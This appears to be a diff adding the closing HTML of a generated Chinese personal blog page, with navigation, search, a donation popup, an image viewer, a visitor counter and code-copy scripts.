+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
